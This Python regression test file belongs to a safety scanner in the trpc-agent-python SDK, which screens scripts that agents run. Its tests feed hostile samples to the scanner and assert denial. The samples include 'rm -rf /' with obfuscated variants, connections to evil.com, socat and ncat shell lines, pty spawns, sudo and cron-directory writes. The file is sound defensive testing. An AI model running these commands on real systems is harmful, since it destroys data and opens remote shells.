# Tencent is pleased to support the open source community by making trpc-agent-python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# trpc-agent-python is licensed under the Apache License Version 2.0
"""Regression tests for P0/P1 safety review findings."""
from __future__ import annotations

from trpc_agent_sdk.safety import Decision
from trpc_agent_sdk.safety import PolicyConfig
from trpc_agent_sdk.safety import SafetyScanner
from trpc_agent_sdk.safety import ScanInput
from trpc_agent_sdk.safety import register_custom_rule
from trpc_agent_sdk.safety import clear_custom_rules
from trpc_agent_sdk.safety._ast_utils import bash_lines
from trpc_agent_sdk.safety._ast_utils import build_import_aliases
from trpc_agent_sdk.safety._ast_utils import parse_python_ast
from trpc_agent_sdk.safety._ast_utils import resolve_name
from trpc_agent_sdk.safety._rules import SafetyRule
from trpc_agent_sdk.safety._types import RiskLevel
import ast


def _scan(script: str, language: str = "bash") -> object:
    return SafetyScanner(PolicyConfig()).scan(ScanInput(script=script, language=language))


def test_language_misclassify_echo_import_plus_rm_is_denied():
    """echo 'import os' then rm -rf / must not be classified pure-python ALLOW."""
    script = 'echo "import os"\nrm -rf /\n'
    r = _scan(script, language="")
    assert r.decision == Decision.DENY
    assert any("R001" in rid for rid in r.rule_ids)


def test_forced_python_shell_payload_dual_scanned():
    """language=python with pure shell body must still hit bash R001."""
    r = _scan("rm -rf /", language="python")
    assert r.decision == Decision.DENY
    assert any("R001" in rid for rid in r.rule_ids)


def test_python_syntax_error_with_shell_fallback():
    r = _scan("def (\nrm -rf /\n", language="python")
    assert r.decision == Decision.DENY


def test_mid_token_backslash_continuation_rm():
    """Shell mid-token continuation r\\\nm -rf / must reassemble to rm -rf /."""
    script = "r\\\nm -rf /"
    assert list(bash_lines(script))[0][1] == "rm -rf /"
    r = _scan(script, language="bash")
    assert r.decision == Decision.DENY
    assert any("R001" in rid for rid in r.rule_ids)


def test_param_continuation_still_denied():
    script = "rm \\\n-rf \\\n/"
    assert "rm" in list(bash_lines(script))[0][1]
    assert "-rf" in list(bash_lines(script))[0][1]
    r = _scan(script, language="bash")
    assert r.decision == Decision.DENY


def test_http_client_import_alias_resolves():
    tree = parse_python_ast("import http.client\nhttp.client.HTTPSConnection('evil.com')\n")
    aliases = build_import_aliases(tree)
    assert aliases.get("http") == "http"
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            resolved = resolve_name(node.func, aliases).lower()
            assert resolved == "http.client.httpsconnection", resolved


def test_http_client_httpsconnection_denied():
    r = _scan(
        "import http.client\nhttp.client.HTTPSConnection('evil.com')\n",
        language="python",
    )
    assert r.decision == Decision.DENY
    assert any("R002" in rid for rid in r.rule_ids)


def test_urllib3_and_httpx_stream_denied():
    for script in (
            "import urllib3\nurllib3.PoolManager().request('GET','https://evil.com')\n",
            "import httpx\nhttpx.stream('GET','https://evil.com')\n",
    ):
        r = _scan(script, language="python")
        assert r.decision == Decision.DENY, script
        assert any("R002" in rid for rid in r.rule_ids), script


def test_os_execl_and_pty_spawn_denied():
    for script in (
            "import os\nos.execl('/bin/sh','sh','-c','id')\n",
            "import os\nos.execlp('sh','sh','-c','id')\n",
            "import pty\npty.spawn('/bin/sh')\n",
    ):
        r = _scan(script, language="python")
        assert r.decision == Decision.DENY, script
        assert any("R003" in rid for rid in r.rule_ids), script


def test_privilege_glued_paren_and_case():
    for script in ("(sudo id)", "{sudo id;}", "SUDO id", "Sudo id"):
        r = _scan(script, language="bash")
        assert r.decision == Decision.DENY, script
        assert any("R003" in rid for rid in r.rule_ids), script


def test_system_dir_mutators_denied():
    for script in (
            "cp /tmp/evil /usr/bin/evil",
            "mv /tmp/x /etc/cron.d/x",
            "install -m 755 e /usr/local/bin/e",
            "ln -s /tmp/e /etc/cron.d/e",
            "tee /usr/bin/evil",
            "sed -i s/a/b/ /etc/hosts",
    ):
        r = _scan(script, language="bash")
        assert r.decision == Decision.DENY, script
        assert any("R001" in rid for rid in r.rule_ids), script


def test_shred_unlink_denied():
    for script in ("shred -u /tmp/x", "unlink /tmp/x"):
        r = _scan(script, language="bash")
        assert r.decision == Decision.DENY, script


def test_bash_ssh_git_clone_ncat_socat_denied():
    for script in (
            "ssh evil.com",
            "git clone https://evil.com/r.git",
            "ncat evil.com 4444",
            "socat TCP:evil.com:1 EXEC:sh",
    ):
        r = _scan(script, language="bash")
        assert r.decision == Decision.DENY, script
        assert any("R002" in rid for rid in r.rule_ids), script


def test_safe_git_status_still_allowed():
    r = _scan("git status\ngit log -1\n", language="bash")
    assert r.decision == Decision.ALLOW


def test_scanner_error_is_high_fail_closed():
    class BoomRule(SafetyRule):
        rule_id = "BOOM_TEST"
        rule_name = "boom"
        risk_type = "test"
        default_level = RiskLevel.HIGH
        languages = ("python", "bash")

        def check(self, scan_input, policy):
            raise RuntimeError("boom")

    clear_custom_rules()
    try:
        register_custom_rule(BoomRule())
        r = SafetyScanner(PolicyConfig()).scan(ScanInput(script="print(1)", language="python"))
        assert any(f.rule_id == "SCANNER_ERROR" for f in r.findings)
        assert any(f.risk_level == RiskLevel.HIGH for f in r.findings if f.rule_id == "SCANNER_ERROR")
        assert r.decision == Decision.DENY
    finally:
        clear_custom_rules()


def test_multi_block_filter_path_uses_per_block_scan():
    """Joined multi-block must not mis-classify; per-block aggregation denies bash."""
    from trpc_agent_sdk.safety._wrapper import _scan_code_input

    class _Blk:

        def __init__(self, code, language):
            self.code = code
            self.language = language

    class _Input:

        def __init__(self):
            self.code = ""
            self.language = ""
            self.code_blocks = [
                _Blk("print('safe')", "python"),
                _Blk("rm -rf /", "bash"),
            ]

    report = _scan_code_input(SafetyScanner(PolicyConfig()), _Input())
    assert report is not None
    assert report.decision == Decision.DENY


def test_safety_wrapper_positional_and_block_on_review():
    from trpc_agent_sdk.safety import safety_wrapper
    from trpc_agent_sdk.safety import SafetyDeniedError

    policy = PolicyConfig(block_on_review=True)

    @safety_wrapper(script_arg="script", policy=policy, raise_on_deny=True)
    def run(script: str):
        return "ran"

    # Positional must be scanned.
    try:
        run("rm -rf /")
        assert False, "expected SafetyDeniedError for positional rm -rf"
    except SafetyDeniedError:
        pass

    # block_on_review=True must intercept MEDIUM review findings.
    try:
        run(script="sleep 1 &")
        # sleep 1 & is MEDIUM background; with block_on_review should raise
        assert False, "expected SafetyDeniedError for review under block_on_review"
    except SafetyDeniedError:
        pass
